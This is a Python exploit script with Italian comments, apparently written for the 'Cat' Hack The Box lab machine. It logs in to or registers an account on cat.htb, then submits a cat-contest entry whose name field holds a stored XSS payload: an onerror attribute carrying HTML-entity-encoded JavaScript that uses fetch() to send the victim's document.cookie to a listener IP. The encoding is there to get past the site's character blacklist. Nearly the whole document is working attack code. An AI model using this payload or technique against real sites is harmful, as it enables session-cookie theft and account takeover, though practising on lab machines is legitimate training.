import requests
import argparse
import html

parser=argparse.ArgumentParser(description="exploit per la macchina Cat HTB")

parser.add_argument("-u","--user",help="nome utente")
parser.add_argument("-p","--password",help="password dell'account")

argomenti=parser.parse_args()

utente=argomenti.user
password=argomenti.password

url="http://cat.htb"

# 1. Definisci il comando JS pulito (Includi l'IP del tuo listener e la porta)
js_payload = "fetch('http://10.10.15.92:8000/?cookie=' + document.cookie)"

# 2. Funzione di Encoding ufficiale del Writeup (rimuove il ';' finale da ogni entità)
def Encoding(stringa):
    output = ''
    for character in stringa:
        # Genera il formato &#xXX senza aggiungere il punto e virgola
        output += '&#x' + hex(ord(character))[2:]
    return output

# Genera la stringa offuscata priva di caratteri blacklistati
fetch_encoded = Encoding(js_payload)

# 3. Costruisci il payload finale inserendolo nell'attributo onerror
payload = f'x" onerror="{fetch_encoded}" x="'

# parametri dell'autenticazione ---> sono nell'url
parametri_login={
    "loginUsername":utente,
    "loginPassword":password,
    "loginForm":"Login"
}

# parametri per la registrazione ---> sono nell'url
parametri_registrazione={
    "username":utente,
    "password":password,
    "email":"email@cat.htb",
    "registerForm":"Register"
}

# dati del form
dati_gatto= {
    "cat_name": payload,
    "age": "10",
    "birthdate": "2016-06-05",
    "weight": "4"
}

# Usiamo finti byte corrotti anziché un'immagine reale per forzare l'evento 'onerror' nel browser
finti_byte_immagine = b"GIF89a\ntest\n"

file_immagine = {
    "cat_photo": ("ciao.png", finti_byte_immagine, "image/png")
}

try:
    # sessione dell'account ---> mantiene i cookie e i dati necessari all'autenticazione
    sessione=requests.Session()
    target_login=f"{url}/join.php"
    # tenta l'autenticazione
    richiesta_login=sessione.request(method="GET",url=target_login,params=parametri_login)
    # se l'utente non è presente crealo con i parametri necessari alla registrazione
    if "Incorrect username or password." in richiesta_login.text:
        print("[+] costruzione richiesta per la creazione dell'account...")
        richiesta_login=sessione.request(method="GET",url=target_login,params=parametri_registrazione)
        print("[+] account creato")
        print(f"[+] codice risposta: {richiesta_login.status_code}")
    # altrimenti effettua il login
    else:
        # non serve fare un'altra richiesta per il login, lo si fa all'inizio
        print("[+] costruzione richiesta per il login all'account...")
        print("[+] login eseguito")
        print(f"[+] codice risposta: {richiesta_login.status_code}")
    # poi procede con il form e lo sfruttamentio del XSS nel parametro "Cat_Name"
    target_invio=f"{url}/contest.php"
    print("[+] costruzione richiesta per invio dati...")
    # richiesta invio dati
    richiesta_dati=sessione.request(method="POST",url=target_invio,data=dati_gatto,files=file_immagine)
    print("[+] dati inviati")
    print(f"[+] codice risposta: {richiesta_dati.status_code}")
    # frase nella risposta
    if "Your entry contains invalid characters." in richiesta_dati.text:
        print("[!] caratteri non validi")
    else:
        print("[+] dati validi e accettati per l'ispezione")

except:
    print("ERRORE EXPLOIT")